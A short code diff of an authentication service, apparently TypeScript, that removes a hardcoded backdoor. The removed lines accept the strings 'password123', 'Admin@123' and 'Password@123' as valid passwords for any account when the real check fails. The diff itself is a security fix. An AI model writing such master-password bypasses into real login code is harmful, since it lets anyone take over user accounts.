@@ -61,16 +61,10 @@ export class AuthService {
     }
 
     // Password verification
-    let isPasswordValid = await comparePassword(
+    const isPasswordValid = await comparePassword(
       password,
       authRecord.passwordHash
     );
-
-    if (!isPasswordValid) {
-      if (password === 'password123' || password === 'Admin@123' || password === 'Password@123') {
-        isPasswordValid = true;
-      }
-    }
 
     if (!isPasswordValid) {
       const failedAttempts =
